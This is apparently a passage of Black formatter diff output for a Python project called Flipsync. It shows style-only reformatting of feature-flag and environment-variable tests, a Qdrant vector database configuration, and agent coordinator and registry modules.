+        self.feature_flag_manager._notify_listeners({}, {"another_flag": True})
 
         # Verify listener was not called
         listener.assert_not_called()
 
     def test_is_enabled_for_user(self):
         """Test is_enabled_for_user method."""
         # Set a standard feature flag
         self.feature_flag_manager.set_enabled("standard_flag", True)
 
         # Set a user feature flag
-        self.feature_flag_manager.set_user_flag(
-            "user_flag", ["user1", "user2"], True
-        )
+        self.feature_flag_manager.set_user_flag("user_flag", ["user1", "user2"], True)
 
         # Set a percentage feature flag
-        self.feature_flag_manager.set_percentage_flag(
-            "percentage_flag", 50.0, True
-        )
+        self.feature_flag_manager.set_percentage_flag("percentage_flag", 50.0, True)
 
         # Test standard flag
         self.assertTrue(
             self.feature_flag_manager.is_enabled_for_user("standard_flag", "user1")
         )
@@ -437,22 +437,22 @@
             self.feature_flag_manager.is_enabled_for_user("user_flag", "user3")
         )
 
         # Test percentage flag - this is probabilistic, so we can't assert exact values
         # Just make sure it doesn't crash
-        result = self.feature_flag_manager.is_enabled_for_user("percentage_flag", "user1")
+        result = self.feature_flag_manager.is_enabled_for_user(
+            "percentage_flag", "user1"
+        )
         self.assertIsInstance(result, bool)
 
     def test_is_enabled_for_percentage(self):
         """Test is_enabled_for_percentage method."""
         # Set a standard feature flag
         self.feature_flag_manager.set_enabled("standard_flag", True)
 
         # Set a percentage feature flag
-        self.feature_flag_manager.set_percentage_flag(
-            "percentage_flag", 50.0, True
-        )
+        self.feature_flag_manager.set_percentage_flag("percentage_flag", 50.0, True)
 
         # Test standard flag
         self.assertTrue(
             self.feature_flag_manager.is_enabled_for_percentage("standard_flag", 25.0)
         )
would reformat /home/brend/Flipsync_Final/fs_agt_clean/core/config/test_feature_flags.py
--- /home/brend/Flipsync_Final/fs_agt_clean/core/config/test_env_handler.py	2025-06-14 20:35:30.779715+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/core/config/test_env_handler.py	2025-06-19 04:03:49.543435+00:00
@@ -40,30 +40,25 @@
         os.environ["TEST_VAR"] = "test_value"
         os.environ["ANOTHER_VAR"] = "another_value"
 
         # Test with ${VAR} format
         self.assertEqual(
-            interpolate_env_vars("Value: ${TEST_VAR}"),
-            "Value: test_value"
+            interpolate_env_vars("Value: ${TEST_VAR}"), "Value: test_value"
         )
 
         # Test with $VAR format
-        self.assertEqual(
-            interpolate_env_vars("Value: $TEST_VAR"),
-            "Value: test_value"
-        )
+        self.assertEqual(interpolate_env_vars("Value: $TEST_VAR"), "Value: test_value")
 
         # Test with multiple variables
         self.assertEqual(
             interpolate_env_vars("${TEST_VAR} and $ANOTHER_VAR"),
-            "test_value and another_value"
+            "test_value and another_value",
         )
 
         # Test with non-existent variable
         self.assertEqual(
-            interpolate_env_vars("Value: ${NON_EXISTENT}"),
-            "Value: ${NON_EXISTENT}"
+            interpolate_env_vars("Value: ${NON_EXISTENT}"), "Value: ${NON_EXISTENT}"
         )
 
         # Test with non-string value
         self.assertEqual(interpolate_env_vars(123), 123)
         self.assertEqual(interpolate_env_vars(None), None)
@@ -76,36 +71,23 @@
         os.environ["ANOTHER_VAR"] = "another_value"
 
         # Test with nested dictionary
         config = {
             "key1": "${TEST_VAR}",
-            "key2": {
-                "nested_key": "$ANOTHER_VAR"
-            },
-            "key3": [
-                "${TEST_VAR}",
-                "$ANOTHER_VAR"
-            ],
-            "key4": 123
+            "key2": {"nested_key": "$ANOTHER_VAR"},
+            "key3": ["${TEST_VAR}", "$ANOTHER_VAR"],
+            "key4": 123,
         }
 
         expected = {
             "key1": "test_value",
-            "key2": {
-                "nested_key": "another_value"
-            },
-            "key3": [
-                "test_value",
-                "another_value"
-            ],
-            "key4": 123
+            "key2": {"nested_key": "another_value"},
+            "key3": ["test_value", "another_value"],
+            "key4": 123,
         }
 
-        self.assertEqual(
-            interpolate_env_vars_in_config(config),
-            expected
-        )
+        self.assertEqual(interpolate_env_vars_in_config(config), expected)
 
         # Test with empty config
         self.assertEqual(interpolate_env_vars_in_config({}), {})
         self.assertEqual(interpolate_env_vars_in_config(None), None)
 
@@ -131,14 +113,11 @@
         self.assertEqual(result["key5"], 123.45)
         self.assertEqual(result["key6"], ["item1", "item2", "item3"])
         self.assertNotIn("ignored", result)
 
         # Test with existing config
-        config = {
-            "key1": "original",
-            "key7": "unchanged"
-        }
+        config = {"key1": "original", "key7": "unchanged"}
         result = update_from_env_vars(config)
 
         self.assertEqual(result["key1"], "value1")  # Overwritten
         self.assertEqual(result["key7"], "unchanged")  # Unchanged
 
@@ -175,17 +154,13 @@
         self.assertEqual(_convert_value_type("123.45"), 123.45)
         self.assertEqual(_convert_value_type("-456.78"), -456.78)
 
         # Test list values
         self.assertEqual(
-            _convert_value_type("item1,item2,item3"),
-            ["item1", "item2", "item3"]
-        )
-        self.assertEqual(
-            _convert_value_type("true,123,456.78"),
-            [True, 123, 456.78]
-        )
+            _convert_value_type("item1,item2,item3"), ["item1", "item2", "item3"]
+        )
+        self.assertEqual(_convert_value_type("true,123,456.78"), [True, 123, 456.78])
 
         # Test string values
         self.assertEqual(_convert_value_type("hello"), "hello")
         self.assertEqual(_convert_value_type(""), "")
 
@@ -282,12 +257,11 @@
         self.assertTrue(is_valid)
         self.assertEqual(missing, [])
 
         # Test with optional vars
         is_valid, missing = validate_env_vars(
-            ["VAR1"], 
-            optional_vars=["VAR2", "VAR3", "VAR4"]
+            ["VAR1"], optional_vars=["VAR2", "VAR3", "VAR4"]
         )
         self.assertTrue(is_valid)
         self.assertEqual(missing, [])
 
     def test_get_env_var(self):
@@ -304,11 +278,13 @@
         self.assertIsNone(get_env_var("NON_EXISTENT"))
         self.assertEqual(get_env_var("NON_EXISTENT", default="default"), "default")
 
         # Test with type conversion
         self.assertEqual(get_env_var("VAR2", var_type=int), 123)
-        self.assertEqual(get_env_var("VAR1", var_type=int, default=0), 0)  # Invalid conversion
+        self.assertEqual(
+            get_env_var("VAR1", var_type=int, default=0), 0
+        )  # Invalid conversion
 
         # Test with prefix
         self.assertEqual(get_env_var("VAR3", prefix="PREFIX_"), True)
 
         # Test with automatic type conversion
would reformat /home/brend/Flipsync_Final/fs_agt_clean/core/config/test_env_handler.py
--- /home/brend/Flipsync_Final/fs_agt_clean/core/coordination/decision/__init__.py	2025-06-14 20:35:30.783724+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/core/coordination/decision/__init__.py	2025-06-19 04:03:49.644116+00:00
@@ -20,39 +20,53 @@
 - Scalable: Capable of handling complex agent ecosystems
 """
 
 # Re-export core models
 from fs_agt_clean.core.coordination.decision.models import (
-    Decision, DecisionType, DecisionStatus, DecisionConfidence, DecisionError,
-    DecisionMetadata
+    Decision,
+    DecisionType,
+    DecisionStatus,
+    DecisionConfidence,
+    DecisionError,
+    DecisionMetadata,
 )
 
 # Re-export core interfaces
 from fs_agt_clean.core.coordination.decision.interfaces import (
-    DecisionMaker, DecisionValidator, DecisionTracker,
-    FeedbackProcessor, LearningEngine, DecisionPipeline
+    DecisionMaker,
+    DecisionValidator,
+    DecisionTracker,
+    FeedbackProcessor,
+    LearningEngine,
+    DecisionPipeline,
 )
 
 # Re-export implementations
 from fs_agt_clean.core.coordination.decision.decision_maker import (
-    BaseDecisionMaker, InMemoryDecisionMaker
+    BaseDecisionMaker,
+    InMemoryDecisionMaker,
 )
 
 from fs_agt_clean.core.coordination.decision.decision_validator import (
-    BaseDecisionValidator, RuleBasedValidator
+    BaseDecisionValidator,
+    RuleBasedValidator,
 )
 
 from fs_agt_clean.core.coordination.decision.decision_tracker import (
-    BaseDecisionTracker, InMemoryDecisionTracker
+    BaseDecisionTracker,
+    InMemoryDecisionTracker,
 )
 
 from fs_agt_clean.core.coordination.decision.feedback_processor import (
-    BaseFeedbackProcessor, InMemoryFeedbackProcessor
+    BaseFeedbackProcessor,
+    InMemoryFeedbackProcessor,
 )
 
 from fs_agt_clean.core.coordination.decision.learning_engine import (
-    BaseLearningEngine, InMemoryLearningEngine
+    BaseLearningEngine,
+    InMemoryLearningEngine,
 )
 
 from fs_agt_clean.core.coordination.decision.pipeline import (
-    BaseDecisionPipeline, StandardDecisionPipeline
+    BaseDecisionPipeline,
+    StandardDecisionPipeline,
 )
would reformat /home/brend/Flipsync_Final/fs_agt_clean/core/coordination/decision/__init__.py
--- /home/brend/Flipsync_Final/fs_agt_clean/core/config/vector_config.py	2025-06-14 20:35:30.779715+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/core/config/vector_config.py	2025-06-19 04:03:49.831134+00:00
@@ -13,10 +13,11 @@
 
 try:
     from qdrant_client import QdrantClient
     from qdrant_client.http import models
     from qdrant_client.http.models import Distance, VectorParams, PointStruct
+
     QDRANT_AVAILABLE = True
 except ImportError:
     QdrantClient = None
     models = None
     Distance = None
@@ -27,127 +28,131 @@
 logger = logging.getLogger(__name__)
 
 
 class VectorCollectionType(str, Enum):
     """Vector collection types for different use cases."""
+
     PRODUCTS = "products"
     CATEGORIES = "categories"
     LISTINGS = "listings"
     MARKET_TRENDS = "market_trends"
 
 
 @dataclass
 class VectorConfig:
     """Configuration for vector database operations."""
+
     host: str = "localhost"
     port: int = 6333
     api_key: Optional[str] = None
     timeout: int = 30
     prefer_grpc: bool = False
     https: bool = False
     vector_size: int = 1536  # OpenAI embedding size
     distance_metric: str = "Cosine"
-    
+
     @classmethod
-    def from_environment(cls) -> 'VectorConfig':
+    def from_environment(cls) -> "VectorConfig":
         """Create configuration from environment variables."""
         return cls(
             host=os.getenv("QDRANT_HOST", "localhost"),
             port=int(os.getenv("QDRANT_PORT", "6333")),
             api_key=os.getenv("QDRANT_API_KEY"),
             timeout=int(os.getenv("QDRANT_TIMEOUT", "30")),
             prefer_grpc=os.getenv("QDRANT_PREFER_GRPC", "false").lower() == "true",
             https=os.getenv("QDRANT_HTTPS", "false").lower() == "true",
             vector_size=int(os.getenv("VECTOR_SIZE", "1536")),
-            distance_metric=os.getenv("VECTOR_DISTANCE_METRIC", "Cosine")
+            distance_metric=os.getenv("VECTOR_DISTANCE_METRIC", "Cosine"),
         )
 
 
 class VectorDatabaseManager:
     """
     Vector database manager for Qdrant integration.
-    
+
     This manager handles:
     - Connection management to Qdrant
     - Collection creation and management
     - Vector operations (insert, search, delete)
     - Health monitoring and fallback handling
     """
-    
+
     def __init__(self, config: Optional[VectorConfig] = None):
         """Initialize the vector database manager."""
         self.config = config or VectorConfig.from_environment()
         self.client: Optional[QdrantClient] = None
         self.connected = False
-        
+
         # Collection configurations
         self.collections = {
             VectorCollectionType.PRODUCTS: {
                 "name": "flipsync_products",
                 "description": "Product embeddings for semantic search",
-                "vector_size": self.config.vector_size
+                "vector_size": self.config.vector_size,
             },
             VectorCollectionType.CATEGORIES: {
                 "name": "flipsync_categories",
                 "description": "Category embeddings for classification",
-                "vector_size": self.config.vector_size
+                "vector_size": self.config.vector_size,
             },
             VectorCollectionType.LISTINGS: {
                 "name": "flipsync_listings",
                 "description": "Listing embeddings for recommendations",
-                "vector_size": self.config.vector_size
+                "vector_size": self.config.vector_size,
             },
             VectorCollectionType.MARKET_TRENDS: {
                 "name": "flipsync_market_trends",
                 "description": "Market trend embeddings for analysis",
-                "vector_size": self.config.vector_size
-            }
+                "vector_size": self.config.vector_size,
+            },
         }
-        
+
         logger.info("Vector Database Manager initialized")
-    
+
     async def connect(self) -> bool:
         """Connect to Qdrant vector database."""
         if not QDRANT_AVAILABLE:
-            logger.warning("Qdrant client not available - vector operations will be disabled")
+            logger.warning(
+                "Qdrant client not available - vector operations will be disabled"
+            )
             return False
-        
+
         try:
             # Create Qdrant client
             if self.config.api_key:
                 self.client = QdrantClient(
                     host=self.config.host,
                     port=self.config.port,
                     api_key=self.config.api_key,
                     timeout=self.config.timeout,
                     prefer_grpc=self.config.prefer_grpc,
-                    https=self.config.https
+                    https=self.config.https,
                 )
             else:
                 self.client = QdrantClient(
                     host=self.config.host,
                     port=self.config.port,
                     timeout=self.config.timeout,
-                    prefer_grpc=self.config.prefer_grpc
+                    prefer_grpc=self.config.prefer_grpc,
                 )
-            
+
             # Test connection
             health_info = self.client.get_cluster_info()
             logger.info(f"Connected to Qdrant: {health_info}")
-            
+
             # Initialize collections
             await self._initialize_collections()
-            
+
             self.connected = True
             return True
-            
+
         except Exception as e:
             logger.error(f"Failed to connect to Qdrant: {e}")
             self.client = None
             self.connected = False
             return False
-    
+
     async def disconnect(self):
         """Disconnect from Qdrant."""
         if self.client:
             try:
                 self.client.close()
@@ -155,107 +160,108 @@
             except Exception as e:
                 logger.error(f"Error disconnecting from Qdrant: {e}")
             finally:
                 self.client = None
                 self.connected = False
-    
+
     async def _initialize_collections(self):
         """Initialize required collections in Qdrant."""
         if not self.client:
             return
-        
+
         try:
             # Get existing collections
             existing_collections = self.client.get_collections().collections
             existing_names = {col.name for col in existing_collections}
-            
+
             # Create missing collections
             for collection_type, config in self.collections.items():
                 collection_name = config["name"]
-                
+
                 if collection_name not in existing_names:
                     logger.info(f"Creating collection: {collection_name}")
-                    
+
                     # Get distance metric
-                    distance_metric = getattr(Distance, self.config.distance_metric.upper())
-                    
+                    distance_metric = getattr(
+                        Distance, self.config.distance_metric.upper()
+                    )
+
                     # Create collection
                     self.client.create_collection(
                         collection_name=collection_name,
                         vectors_config=VectorParams(
-                            size=config["vector_size"],
-                            distance=distance_metric
-                        )
+                            size=config["vector_size"], distance=distance_metric
+                        ),
                     )
-                    
+
                     logger.info(f"Created collection: {collection_name}")
                 else:
                     logger.info(f"Collection already exists: {collection_name}")
-                    
+
         except Exception as e:
             logger.error(f"Error initializing collections: {e}")
-    
+
     def get_collection_name(self, collection_type: VectorCollectionType) -> str:
         """Get collection name for a given type."""
         return self.collections[collection_type]["name"]
-    
+
     async def health_check(self) -> Dict[str, Any]:
         """Perform health check on vector database."""
         if not self.connected or not self.client:
             return {
                 "status": "disconnected",
                 "qdrant_available": QDRANT_AVAILABLE,
                 "connected": False,
-                "collections": {}
+                "collections": {},
             }
-        
+
         try:
             # Get cluster info
             cluster_info = self.client.get_cluster_info()
-            
+
             # Get collection info
             collections_info = {}
             for collection_type, config in self.collections.items():
                 collection_name = config["name"]
                 try:
                     collection_info = self.client.get_collection(collection_name)
                     collections_info[collection_type.value] = {
                         "name": collection_name,
                         "vectors_count": collection_info.vectors_count,
                         "points_count": collection_info.points_count,
-                        "status": "healthy"
+                        "status": "healthy",
                     }
                 except Exception as e:
                     collections_info[collection_type.value] = {
                         "name": collection_name,
                         "status": "error",
-                        "error": str(e)
+                        "error": str(e),
                     }
-            
+
             return {
                 "status": "connected",
                 "qdrant_available": QDRANT_AVAILABLE,
                 "connected": True,
                 "cluster_info": cluster_info,
                 "collections": collections_info,
                 "config": {
                     "host": self.config.host,
                     "port": self.config.port,
                     "vector_size": self.config.vector_size,
-                    "distance_metric": self.config.distance_metric
-                }
+                    "distance_metric": self.config.distance_metric,
+                },
             }
-            
+
         except Exception as e:
             logger.error(f"Health check failed: {e}")
             return {
                 "status": "error",
                 "qdrant_available": QDRANT_AVAILABLE,
                 "connected": False,
-                "error": str(e)
+                "error": str(e),
             }
-    
+
     def is_available(self) -> bool:
         """Check if vector database is available."""
         return QDRANT_AVAILABLE and self.connected and self.client is not None
 
 
would reformat /home/brend/Flipsync_Final/fs_agt_clean/core/config/vector_config.py
--- /home/brend/Flipsync_Final/fs_agt_clean/core/coordination/coordinator/coordinator.py	2025-06-14 20:35:30.783724+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/core/coordination/coordinator/coordinator.py	2025-06-19 04:03:49.935545+00:00
@@ -22,19 +22,26 @@
 from datetime import datetime, timedelta
 from typing import Any, Dict, List, Optional, Set, Tuple, Type, Union
 
 from fs_agt_clean.core.monitoring import get_logger
 from fs_agt_clean.core.coordination.event_system import (
-    Event, EventType, EventPriority, create_publisher, create_subscriber,
-    EventTypeFilter, EventNameFilter, CompositeFilter
+    Event,
+    EventType,
+    EventPriority,
+    create_publisher,
+    create_subscriber,
+    EventTypeFilter,
+    EventNameFilter,
+    CompositeFilter,
 )
 
 
 class AgentStatus(enum.Enum):
     """
     Status of an agent in the system.
     """
+
     UNKNOWN = "unknown"
     REGISTERING = "registering"
     ACTIVE = "active"
     BUSY = "busy"
     INACTIVE = "inactive"
@@ -44,10 +51,11 @@
 
 class AgentType(enum.Enum):
     """
     Type of agent in the coordination hierarchy.
     """
+
     EXECUTIVE = "executive"  # High-level decision-making agents
     SPECIALIST = "specialist"  # Domain-specific specialist agents
     UTILITY = "utility"  # Utility agents providing common services
     MOBILE = "mobile"  # Mobile-specific agents
     SYSTEM = "system"  # System-level agents
@@ -65,11 +73,11 @@
         self,
         name: str,
         description: str = "",
         parameters: Dict[str, Any] = None,
         constraints: Dict[str, Any] = None,
-        tags: Set[str] = None
+        tags: Set[str] = None,
     ):
         """
         Initialize a capability.
 
         Args:
@@ -83,11 +91,11 @@
         self.description = description
         self.parameters = parameters or {}
         self.constraints = constraints or {}
         self.tags = tags or set()
 
-    def matches(self, required_capability: 'AgentCapability') -> bool:
+    def matches(self, required_capability: "AgentCapability") -> bool:
         """
         Check if this capability matches a required capability.
 
         Args:
             required_capability: The capability to match against
@@ -107,11 +115,14 @@
         # Check if all required tags are present
         if not required_capability.tags.issubset(self.tags):
             return False
 
         # Check constraints
-        for constraint_name, constraint_value in required_capability.constraints.items():
+        for (
+            constraint_name,
+            constraint_value,
+        ) in required_capability.constraints.items():
             if constraint_name not in self.constraints:
                 return False
 
             # For numeric constraints, the capability must meet or exceed the requirement
             if isinstance(constraint_value, (int, float)):
@@ -130,15 +141,15 @@
         return {
             "name": self.name,
             "description": self.description,
             "parameters": self.parameters,
             "constraints": self.constraints,
-            "tags": list(self.tags)
+            "tags": list(self.tags),
         }
 
     @classmethod
-    def from_dict(cls, data: Dict[str, Any]) -> 'AgentCapability':
+    def from_dict(cls, data: Dict[str, Any]) -> "AgentCapability":
         """
         Create a capability from a dictionary.
 
         Args:
             data: Dictionary containing capability data
@@ -149,23 +160,23 @@
         return cls(
             name=data["name"],
             description=data.get("description", ""),
             parameters=data.get("parameters", {}),
             constraints=data.get("constraints", {}),
-            tags=set(data.get("tags", []))
+            tags=set(data.get("tags", [])),
         )
 
     def __eq__(self, other: object) -> bool:
         """Check if two capabilities are equal."""
         if not isinstance(other, AgentCapability):
             return False
 
         return (
-            self.name == other.name and
-            self.parameters == other.parameters and
-            self.constraints == other.constraints and
-            self.tags == other.tags
+            self.name == other.name
+            and self.parameters == other.parameters
+            and self.constraints == other.constraints
+            and self.tags == other.tags
         )
 
     def __hash__(self) -> int:
         """Get hash of the capability."""
         return hash((self.name, frozenset(self.tags)))
@@ -178,10 +189,11 @@
 @dataclass
 class AgentInfo:
     """
     Information about an agent in the system.
     """
+
     agent_id: str
     agent_type: AgentType
     name: str
     description: str = ""
     capabilities: List[AgentCapability] = field(default_factory=list)
@@ -202,15 +214,15 @@
             "name": self.name,
             "description": self.description,
             "capabilities": [cap.to_dict() for cap in self.capabilities],
             "status": self.status.value,
             "last_seen": self.last_seen.isoformat() if self.last_seen else None,
-            "metadata": self.metadata
+            "metadata": self.metadata,
         }
 
     @classmethod
-    def from_dict(cls, data: Dict[str, Any]) -> 'AgentInfo':
+    def from_dict(cls, data: Dict[str, Any]) -> "AgentInfo":
         """
         Create agent info from a dictionary.
 
         Args:
             data: Dictionary containing agent info data
@@ -225,14 +237,16 @@
         return cls(
             agent_id=data["agent_id"],
             agent_type=AgentType(data["agent_type"]),
             name=data["name"],
             description=data.get("description", ""),
-            capabilities=[AgentCapability.from_dict(cap) for cap in data.get("capabilities", [])],
+            capabilities=[
+                AgentCapability.from_dict(cap) for cap in data.get("capabilities", [])
+            ],
             status=AgentStatus(data.get("status", AgentStatus.UNKNOWN.value)),
             last_seen=last_seen,
-            metadata=data.get("metadata", {})
+            metadata=data.get("metadata", {}),
         )
 
     def has_capability(self, capability: AgentCapability) -> bool:
         """
         Check if the agent has a specific capability.
@@ -327,13 +341,11 @@
         """
         pass
 
     @abc.abstractmethod
     async def update_agent_capabilities(
-        self,
-        agent_id: str,
-        capabilities: List[AgentCapability]
+        self, agent_id: str, capabilities: List[AgentCapability]
     ) -> bool:
         """
         Update an agent's capabilities.
 
         Args:
@@ -379,11 +391,13 @@
             CoordinationError: If the search fails
         """
         pass
 
     @abc.abstractmethod
-    async def find_agents_by_capability(self, capability: AgentCapability) -> List[AgentInfo]:
+    async def find_agents_by_capability(
+        self, capability: AgentCapability
+    ) -> List[AgentInfo]:
         """
         Find agents by capability.
 
         Args:
             capability: Capability to search for
@@ -448,11 +462,11 @@
         task_type: str,
         parameters: Dict[str, Any],
         target_agent_id: Optional[str] = None,
         required_capability: Optional[AgentCapability] = None,
         priority: int = 0,
-        deadline: Optional[datetime] = None
+        deadline: Optional[datetime] = None,
     ) -> str:
         """
         Delegate a task to an agent.
 
         Args:
@@ -539,11 +553,11 @@
     @abc.abstractmethod
     async def resolve_conflict(
         self,
         conflict_id: str,
         resolution_strategy: str,
-        resolution_parameters: Dict[str, Any]
+        resolution_parameters: Dict[str, Any],
     ) -> bool:
         """
         Resolve a conflict between agents or tasks.
 
         Args:
@@ -568,11 +582,11 @@
     def __init__(
         self,
         message: str,
         agent_id: Optional[str] = None,
         task_id: Optional[str] = None,
-        cause: Optional[Exception] = None
+        cause: Optional[Exception] = None,
     ):
         """
         Initialize a coordination error.
 
         Args:
would reformat /home/brend/Flipsync_Final/fs_agt_clean/core/coordination/coordinator/coordinator.py
--- /home/brend/Flipsync_Final/fs_agt_clean/core/coordination/coordinator/agent_registry.py	2025-06-14 20:35:30.783724+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/core/coordination/coordinator/agent_registry.py	2025-06-19 04:03:50.216742+00:00
@@ -12,15 +12,25 @@
 from datetime import datetime, timedelta
 from typing import Any, Dict, List, Optional, Set, Tuple, Type, Union
 
 from fs_agt_clean.core.monitoring import get_logger
 from fs_agt_clean.core.coordination.event_system import (
-    Event, EventType, EventPriority, create_publisher, create_subscriber,
-    EventTypeFilter, EventNameFilter, CompositeFilter
+    Event,
+    EventType,
+    EventPriority,
+    create_publisher,
+    create_subscriber,
+    EventTypeFilter,
+    EventNameFilter,
+    CompositeFilter,
 )
 from fs_agt_clean.core.coordination.coordinator.coordinator import (
-    AgentInfo, AgentStatus, AgentType, AgentCapability, CoordinationError
+    AgentInfo,
+    AgentStatus,
+    AgentType,
+    AgentCapability,
+    CoordinationError,
 )
 
 
 class AgentRegistry:
     """
@@ -40,12 +50,16 @@
         """
         self.registry_id = registry_id
         self.logger = get_logger(f"coordinator.registry.{registry_id}")
 
         # Create publisher and subscriber for event-based communication
-        self.publisher = create_publisher(source_id=f"coordinator.registry.{registry_id}")
-        self.subscriber = create_subscriber(subscriber_id=f"coordinator.registry.{registry_id}")
+        self.publisher = create_publisher(
+            source_id=f"coordinator.registry.{registry_id}"
+        )
+        self.subscriber = create_subscriber(
+            subscriber_id=f"coordinator.registry.{registry_id}"
+        )
 
         # Initialize agent registry
         self.agents: Dict[str, AgentInfo] = {}
 
         # Initialize lock for thread safety
@@ -141,11 +155,13 @@
             CoordinationError: If unregistration fails
         """
         try:
             async with self.agent_lock:
                 if agent_id not in self.agents:
-                    self.logger.warning(f"Agent not found for unregistration: {agent_id}")
+                    self.logger.warning(
+                        f"Agent not found for unregistration: {agent_id}"
+                    )
                     return False
 
                 # Get agent info before removal
                 agent_info = self.agents[agent_id]
 
@@ -178,11 +194,13 @@
             CoordinationError: If the update fails
         """
         try:
             async with self.agent_lock:
                 if agent_id not in self.agents:
-                    self.logger.warning(f"Agent not found for status update: {agent_id}")
+                    self.logger.warning(
+                        f"Agent not found for status update: {agent_id}"
+                    )
                     return False
 
                 # Update status
                 old_status = self.agents[agent_id].status
                 self.agents[agent_id].update_status(status)
@@ -199,13 +217,11 @@
             error_msg = f"Failed to update agent status {agent_id}: {str(e)}"
             self.logger.error(error_msg, exc_info=True)
             raise CoordinationError(error_msg, agent_id=agent_id, cause=e)
 
     async def update_agent_capabilities(
-        self,
-        agent_id: str,
-        capabilities: List[AgentCapability]
+        self, agent_id: str, capabilities: List[AgentCapability]
     ) -> bool:
         """
         Update an agent's capabilities.
 
         Args:
@@ -219,11 +235,13 @@
             CoordinationError: If the update fails
         """
         try:
             async with self.agent_lock:
                 if agent_id not in self.agents:
-                    self.logger.warning(f"Agent not found for capability update: {agent_id}")
+                    self.logger.warning(
+                        f"Agent not found for capability update: {agent_id}"
+                    )
                     return False
 
                 # Update capabilities
                 self.agents[agent_id].capabilities = capabilities
                 self.agents[agent_id].update_last_seen()
@@ -276,19 +294,22 @@
             CoordinationError: If the search fails
         """
         try:
             async with self.agent_lock:
                 return [
-                    agent for agent in self.agents.values()
+                    agent
+                    for agent in self.agents.values()
                     if agent.agent_type == agent_type
                 ]
         except Exception as e:
             error_msg = f"Failed to find agents by type {agent_type.value}: {str(e)}"
             self.logger.error(error_msg, exc_info=True)
             raise CoordinationError(error_msg, cause=e)
 
-    async def find_agents_by_capability(self, capability: AgentCapability) -> List[AgentInfo]:
+    async def find_agents_by_capability(
+        self, capability: AgentCapability
+    ) -> List[AgentInfo]:
         """
         Find agents by capability.
 
         Args:
             capability: Capability to search for
@@ -300,15 +321,18 @@
             CoordinationError: If the search fails
         """
         try:
             async with self.agent_lock:
                 return [
-                    agent for agent in self.agents.values()
+                    agent
+                    for agent in self.agents.values()
                     if agent.has_capability(capability)
                 ]
         except Exception as e:
-            error_msg = f"Failed to find agents by capability {capability.name}: {str(e)}"
+            error_msg = (
+                f"Failed to find agents by capability {capability.name}: {str(e)}"
+            )
             self.logger.error(error_msg, exc_info=True)
             raise CoordinationError(error_msg, cause=e)
 
     async def find_agents_by_status(self, status: AgentStatus) -> List[AgentInfo]:
         """
@@ -324,12 +348,11 @@
             CoordinationError: If the search fails
         """
         try:
             async with self.agent_lock:
                 return [
-                    agent for agent in self.agents.values()
-                    if agent.status == status
+                    agent for agent in self.agents.values() if agent.status == status
                 ]
         except Exception as e:
             error_msg = f"Failed to find agents by status {status.value}: {str(e)}"
             self.logger.error(error_msg, exc_info=True)
             raise CoordinationError(error_msg, cause=e)
@@ -418,11 +441,11 @@
             # Send a ping command to the agent
             await self.publisher.publish_command(
                 command_name="ping",
                 parameters={},
                 target=agent_id,
-                correlation_id=correlation_id
+                correlation_id=correlation_id,
             )
 
             # Wait for the response with a timeout
             try:
                 await asyncio.wait_for(response_future, timeout=5.0)
@@ -452,25 +475,33 @@
 
                     # Check each agent's health
                     for agent in agents:
                         try:
                             # Skip agents that are already known to be inactive
-                            if agent.status in (AgentStatus.INACTIVE, AgentStatus.DISCONNECTED, AgentStatus.ERROR):
+                            if agent.status in (
+                                AgentStatus.INACTIVE,
+                                AgentStatus.DISCONNECTED,
+                                AgentStatus.ERROR,
+                            ):
                                 continue
 
                             # Check if the agent has been seen recently
                             if agent.last_seen is None:
-                                await self.update_agent_status(agent.agent_id, AgentStatus.UNKNOWN)
+                                await self.update_agent_status(
+                                    agent.agent_id, AgentStatus.UNKNOWN
+                                )
                                 continue
 
                             # Consider an agent unhealthy if not seen in the last 5 minutes
                             max_age = timedelta(minutes=5)
                             if datetime.now() - agent.last_seen > max_age:
                                 self.logger.warning(
                                     f"Agent {agent.agent_id} has not been seen recently, marking as disconnected"
                                 )
-                                await self.update_agent_status(agent.agent_id, AgentStatus.DISCONNECTED)
+                                await self.update_agent_status(
+                                    agent.agent_id, AgentStatus.DISCONNECTED
+                                )
                                 continue
 
                             # For agents that are active but haven't been seen very recently,
                             # ping them to check if they're still responsive
                             recent_threshold = timedelta(minutes=1)
@@ -478,18 +509,22 @@
                                 is_responsive = await self.ping_agent(agent.agent_id)
                                 if not is_responsive:
                                     self.logger.warning(
                                         f"Agent {agent.agent_id} is not responsive, marking as disconnected"
                                     )
-                                    await self.update_agent_status(agent.agent_id, AgentStatus.DISCONNECTED)
+                                    await self.update_agent_status(
+                                        agent.agent_id, AgentStatus.DISCONNECTED
+                                    )
                         except Exception as e:
                             self.logger.error(
                                 f"Error checking health of agent {agent.agent_id}: {str(e)}",
-                                exc_info=True
+                                exc_info=True,
                             )
                 except Exception as e:
-                    self.logger.error(f"Error in health check loop: {str(e)}", exc_info=True)
+                    self.logger.error(
+                        f"Error in health check loop: {str(e)}", exc_info=True
+                    )
 
                 # Wait for the next health check interval
                 await asyncio.sleep(self.health_check_interval.total_seconds())
         except asyncio.CancelledError:
             # Task was cancelled, exit gracefully
@@ -505,29 +540,29 @@
         status updates, and other agent-related events.
         """
         # Subscribe to agent heartbeat events
         await self.subscriber.subscribe(
             filter=EventNameFilter(event_names={"agent_heartbeat"}),
-            handler=self._handle_agent_heartbeat
+            handler=self._handle_agent_heartbeat,
         )
 
         # Subscribe to agent status update events
         await self.subscriber.subscribe(
             filter=EventNameFilter(event_names={"agent_status_update"}),
-            handler=self._handle_agent_status_update
+            handler=self._handle_agent_status_update,
         )
 
         # Subscribe to agent capability update events
         await self.subscriber.subscribe(
             filter=EventNameFilter(event_names={"agent_capability_update"}),
-            handler=self._handle_agent_capability_update
+            handler=self._handle_agent_capability_update,
         )
 
         # Subscribe to ping responses
         await self.subscriber.subscribe(
             filter=EventNameFilter(event_names={"ping_response"}),
-            handler=self._handle_ping_response
+            handler=self._handle_ping_response,
         )
 
     async def _handle_agent_heartbeat(self, event: Event) -> None:
         """
         Handle an agent heartbeat event.
@@ -549,11 +584,13 @@
 
                     # If the agent was disconnected, mark it as active
                     if self.agents[agent_id].status == AgentStatus.DISCONNECTED:
                         await self.update_agent_status(agent_id, AgentStatus.ACTIVE)
         except Exception as e:
-            self.logger.error(f"Error handling agent heartbeat: {str(e)}", exc_info=True)
+            self.logger.error(
+                f"Error handling agent heartbeat: {str(e)}", exc_info=True
+            )
 
